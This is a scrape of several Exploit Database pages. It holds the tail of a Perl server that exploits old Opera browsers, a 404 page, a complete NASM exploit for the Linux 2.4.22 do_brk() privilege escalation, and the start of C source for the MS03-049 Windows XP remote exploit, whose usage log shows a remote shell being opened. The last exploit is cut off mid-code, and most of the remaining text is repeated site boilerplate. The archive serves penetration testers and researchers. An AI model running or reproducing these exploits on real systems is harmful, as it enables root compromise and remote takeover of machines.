$daemon->accept()) {printf("[*] incoming client : from %s:%d(%08X).\n",inet_ntoa($ccon->peeraddr()), $ccon->peerport(), $ccon);if (my $req = $ccon->get_request()) {print("\n[*] request received...\n", map{" >>  $_\n"}($req->as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);if ($req->method eq 'GET') {my $url = URL;my $res = new HTTP::Response(200, 'OK', new HTTP::Headers(RES_HEADERS));$res->protocol("HTTP/1.0");if ($req->url->path eq '/') {$res->header('Content-type'=>'text/html');$res->content(qq~<a href="$url">Click here</a>~);} else {my $mimetype = $MIMETYPES[rand(@MIMETYPES)];if ($req->header('User-Agent')=~m~Opera[\s+/]((\d\.\d)\d)~i){# Opera 7.0xif ($2 eq "7.0") {$url .= '*.zip';# '*' is a special char :-)$mimetype = $MIMETYPES[$#MIMETYPES];# Opera 7.22} elsif ($1 eq "7.22") {$mimetype = $MIMETYPES[rand(@MIMETYPES-2)];}}$res->header('Content-type'=>$mimetype);$res->content(FILE_CONTENT);}$ccon->send_response($res);print("\n[*] response sent...\n", map{" >>  $_\n"}($res->as_string() =~ /^([^\r\n]+)/mg)) if (VIEW_DATA);} else {$ccon->send_error(RC_METHOD_NOT_ALLOWED);}}printf("[*] client closed : from %s:%d (%08X).\n",inet_ntoa($ccon->peeraddr()), $ccon->peerport(), $ccon);$ccon->close();undef($ccon);}print("[*] server closed.\n");$daemon->close();undef($daemon);# milw0rm.com [2003-11-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 128
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 129
Linux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (1) - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.22 - 'do_brk()' Local Privilege Escalation (1)EDB-ID:129CVE:2003-0961EDB Verified:Author:Christophe DevineType:localExploit:/Platform:LinuxDate:2003-12-02Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED; E-DB Note: Updated Exploit ~ https://www.exploit-db.com/exploits/131/;; Christophe Devine (devine at cr0.net) and Julien Tinnes (julien at cr0.org);; This exploit uses sys_brk directly to expand his break and doesn't rely; on the ELF loader to do it.;; To bypass a check in sys_brk against available memory, we use a high; virtual address as base address;; In most case (let's say when no PaX w/ ASLR :) we have to move the stack; so that we can expand our break;BITS 32org     0xBFFF0000ehdr:                                                 ; Elf32_Ehdrdb      0x7F, "ELF", 1, 1, 1            ;   e_identtimes 9 db      0dw      2                               ;   e_typedw      3                               ;   e_machinedd      1                               ;   e_versiondd      _start                          ;   e_entrydd      phdr - $$                       ;   e_phoffdd      0                               ;   e_shoffdd      0                               ;   e_flagsdw      ehdrsize                        ;   e_ehsizedw      phdrsize                        ;   e_phentsizedw      2                               ;   e_phnumdw      0                               ;   e_shentsizedw      0                               ;   e_shnumdw      0                               ;   e_shstrndxehdrsize      equ     $ - ehdrphdr:                                                 ; Elf32_Phdrdd      1                               ;   p_typedd      0                               ;   p_offsetdd      $$                              ;   p_vaddrdd      $$                              ;   p_paddrdd      filesize                        ;   p_fileszdd      filesize                        ;   p_memszdd      7                               ;   p_flagsdd      0x1000                          ;   p_alignphdrsize      equ     $ - phdr_start:; ** Make sure the stack is not above usmov     eax, 163         ; mremapmov     ebx, espand	ebx, ~(0x1000 - 1)	; align to page sizemov	ecx, 0x1000	; we suppose stack is one page onlymov     edx, 0x9000	; be sure it can't get mapped after; usmov     esi,1		; MREMAP_MAYMOVEint     0x80and	esp, (0x1000 - 1)	; offset in pageadd	esp, eax		; stack ptr to new location; nb: we don't fix; pointers so environ/cmdline; are not availablemov	eax,152		; mlockall (for tests as root)mov	ebx,2		; MCL_FUTUREint	0x80; get VMAs for the kernel memorymov     eax,45          ; brkmov     ebx,0xC0500000int	0x80mov	ecx, 4loop0:mov	eax, 2		; forkint	0x80loop	loop0_idle:mov     eax,162         ; nanosleepmov     ebx,timespecint     0x80jmp     _idletimespec      dd      10,0filesize      equ     $ - $$; milw0rm.com [2003-12-02]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 130
Microsoft Windows XP - Workstation Service Remote (MS03-049) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows XP - Workstation Service Remote (MS03-049)EDB-ID:130CVE:2003-0812EDB Verified:Author:fiNisType:remoteExploit:/Platform:WindowsDate:2003-12-04Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* To build new netapi32.libpedump /exp netapi32.dll > netapi32.expbuildlib netapi32.exe netapi32.exp netapi32.lib netapi32.dlld:\>rpc_wks_bo.exeWKS service remote exploit MS03-049 by fiNis (fiNis[at]bk[dot]ru), ver:0.1.1-------------------------------------------------------------------Usage: rpc_wks_bo.exe [-ht]-h <IP>    : Target IP-t <Type>  : Target type (-t0 for a list)d:\>rpc_wks_bo.exe -t0Possible targets are:============================1) Window XP Pro + SP0 [Rus]2) Window XP Pro + SP1 [Rus]3) Crash alld:\>rpc_wks_bo.exe -h 192.168.100.7 -t1[+] Prepare exploit string[+] Sleep at 2s ...[+] Setting up IPC$ session...[+] IPC$ session setup successfully![+] Sending exploit ...[+] Initialize WSAStartup - OK[+] Socket initialized - OK[+] Try connecting to 192.168.100.7:9191 ...[*] Connected to shell at 192.168.100.7:9191Microsoft Windows XP [Âåðñèÿ 5.1.2600](Ñ) Êîðïîðàöèÿ Ìàéêðîñîôò, 1985-2001.C:\WINDOWS\system32>*//**************** Public version *****************/#include <stdio.h>#include <io.h>#include <stdlib.h>#include <string.h>#include <winsock2.h>#include <windows.h>#include <process.h>#pragma lib <ws2_32.lib>#pragma lib <netapi32.lib>#pragma lib <mpr.lib>#define RECVTIMEOUT		1#define VER				"0.1.4"extern char getopt(int,char **,char*);extern char *optarg;// ------------------------------------------------void NetAddAlternateComputerName(wchar_t *Server, wchar_t *AlternateName, wchar_t * DomainAccount,wchar_t *DomainAccountPassword, unsigned int Reserved);void send_exp();// ----------Lamers buff =) ----------------------------char expl[3000];wchar_t expl_uni[6000];char tgt_net[30];wchar_t tgt_net_uni[60];char ipc[30];// -----------------------------------------------------struct {char *os;long jmpesp;}targets[] = {{ "Window XP + SP0 [Rus]            ", 0x77f5801c }, 